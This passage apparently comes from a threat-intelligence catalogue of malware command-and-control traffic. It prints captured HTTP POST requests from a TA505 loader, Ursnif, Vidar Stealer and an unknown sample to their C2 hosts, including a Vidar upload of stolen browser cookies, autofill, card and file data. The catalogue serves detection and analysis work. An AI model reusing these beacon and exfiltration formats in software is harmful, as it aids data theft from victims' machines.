User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; CIBA; MS-RTC LM 8)
Content-Length: 95
Host: windows-sys-update.com

&D=User-PC&U=admin&OS=6.1&PR=Dwm.exe%7CEXCEL.EXE%7CExplorer.EXE%7Ctaskhost.exe%7Cwindanr.exe%7CHTTP/1.1 404 Not Found
Server: nginx/1.10.3
Date: Wed, 09 Oct 2019 18:53:18 GMT
Content-Length: 0
Connection: keep-alive
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ta505-loader.png "TA505 Loader")

#### Ursnif:
~~~
POST /images/wsF0B4sp/ZaYjjdVgt73Q1BSOy_2Fofi/qF_2BfPTuK/5Ha_2F0xEvmbSfT_2/FluJ8ZF_2Fx8/g6xkZAZrZwN/2skHgzv92i_2BS/uPf4RDQvATKCgx0GZ5gez/ph_2BLcscLQkKDVw/HGZ6zA6DhGCqgPD/VTX09Q_2FUWIFyWps1/nfJ0I3rIZ/QNKbXjeu7xXa3W_2FZSX/bcWtE2zC4RafXFoRlqL/4EC4YHwclzkXrfX/58a3.bmp HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: multipart/form-data; boundary=36775038942641984568
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Content-Length: 399
Host: shoshanna.at

--36775038942641984568
Content-Disposition: form-data; name="upload_file"; filename="78C6.bin"

\.\..V.]:.o..<]......H..)E.J=x...e%3..U.@.f......].tZ..1....g..OzC.5v.?o.NL...;..)..E.G.a~.....M#;.Cu;N/.3\$....x.....R....e..5.....-mW,..	..C................n.G.|..k0...@...?I.Iu......9k^.U6tzT9.b.3....#..V.4].La....zL.h+...aa..H.D.....Ar.......3.w.<.!.-.....|F9! 3.....7
--36775038942641984568--
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ursnif.png "Ursnif POST")

#### Vidar Stealer
~~~
POST / HTTP/1.1
Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
Content-Length: 111609
Host: weimachel.net
Connection: Keep-Alive
Cache-Control: no-cache

--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="hwid"

eeeb5d54-7880-42a7-b542-739bbc26cf4b
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="os"

Windows 7 Professional
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="platform"

x64
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="profile"

160
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="user"

admin
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="cccount"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="fcount"

1
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="telegram"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="ver"

13.9
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="ccount"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="logs"; filename="CH_eeeb5d54-7880-42a7-b542-739bbc26cf4b3006040214.zip"
Content-Type: zip

PK........$.HO............#.../Autofill/Google Chrome_Default.txtUT
.....]...]...]..PK........$.HO................/CC/Google Chrome_Default.txtUT
.....]...]...]..PK........$.HOF..`....u...5.../Cookies/cookies_Mozilla Firefox_nltxvmn2.default.txtUT
.....]...]...]..O..0...X.G	......QdFg..G..XI..f....?.R[{.0Unm..U.._..\.f.nEY2S.3..m..?...e........B...'.r..>......P.4..HTQ..H..#.[M..k.R...b.o..d..<$g^..Y......6i.....2.x.....c..-.w..4.....<.....C.\.0q.B.s.m..$E.
...^.D...8..[vJ9c.:....,.J.i!......V....ii.........!.>cz....A..0..@.........Jl. 4.!.R.....".KA.r...w.IT.K).B|......<..P....8..k...y.....Z....Ji
U}...'F.....v.wnu.;.:..a.)...BC...m.Vw.k...I.<.._.]~..0
b..v.&Q@..LH.gSM...fAv&
<......].	...~...{.T....)^..9^......|.=..|.hZ...*7.<h.......Ko8..~.PK........&.HO................/Cookies/Edge_Cookies.txtUT
.....]...]...]..PK........$.HO.'.e........".../Cookies/Google Chrome_Default.txtUT
.....]...]...]..I..P.....Sp.;t...........+..a._?.$....t.R..*U.%I3...)....M. ..x2..S.....S.b...L......d.R...piwR......<~y....AWP..G......P..?.i.....b.'|jz.......&...C.^k.7....d........
..%..tF]..V.g...........T....
M....u..f..<..^..ek/.[...2...P=...3....>.................9J.V&.6..<....f.}......p....{.d..l....!.."...........y.....{N.P....SY.3......V~......z.=....w.o.-j.......$..i&.s]..\...?....*55.f.
...r....#|..NW.EFR......L......fe.
.5..Q.s+...<.... .w..j.....PK........&.HOQ.......F......./Cookies/IE_Cookies.txtUT
.....]...]...].R.n.@.=7...[:]........ .x	`...8$......c..9...J....RRe...w.......,....	..0I.@.... .x...%.....<.].5.........PO\.F...EL..t.he.......x..h..V.c0G0.5%D...P...[m......]8.A."...Av)....J.B..|..D.Eq....8.....f&X......7....nn7.zW]..Y]d#.>O...(.~n....NM...	.".!..`Q&L08XX%....q...=......kVTy.|.lPf.....qm.....t;..~uow....k.@..9..'....i.`.........R.t.{.b......;.9..Pfb.......Tq...}%..s._N.*....	.{._PK........&.HO!...E...j......./cookie_list.txtUT
.....]...]...]U.1
.0..v...?..1.N...C_..C.IB.).O.(...~R..0.....L.x.(:SQ....=~\m.e...PK........$.HO............$.../Downloads/Google Chrome_Default.txtUT
.....]...]...]..PK........0.HO................/Files/Desktop.zipUT
.....]...]...]PK....................PK........4.HO................/Files/Users.zipUT
.....]...]...]PK....................PK........$.HO............".../History/Google Chrome_Default.txtUT
.....]...]...]..PK........$.HO.5..
.......5.../History/history_Mozilla Firefox_nltxvmn2.default.txtUT
.....]...]...]..+.......PK........0.HO..M(.....	....../information.txtUT
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-1.png "Vidar")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-2.png "Vidar")

### Unknowns
#################################################################################################

#### Unknownmalware4
h/t @thlnk3r, hash 0f220c1bd968fe68b729ae3a39f00958bae021169fa9afb0d659beb14f19f7a5
~~~
POST /jab2/s.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded; charset=utf-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Content-Length: 372
Host: dsfhhhhf44555.icu

key=%15%08%00%15%07%12%14%12%02%12%12&sysid=%09%02%07D96%1A%1D%02%0E%04%00FVS+%03%13%05%1A%05%04S%23%07%02%18SWA%5B%25%03%13%00%1A%09%0FSEHP_S%24%14%1A%1F%02ADEVP_SPU%5E%11%0F%15S6%02%08%07%1A%09%0FZ%2C%1EWG%2C94+64L%230BZ%12%17%0B%08%1D%2C%11%08%1D%12%05%02I%00%13%11%03%1C%14%15%12%10%05%0E%06%1D%12Z%1F%3B%1E%24B1%0B%07H%2CSTEJU&resp=%09%0A&rights=%00%07%15%15%00&misc=
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/unknownmalware4.png "Unknownmalware4")
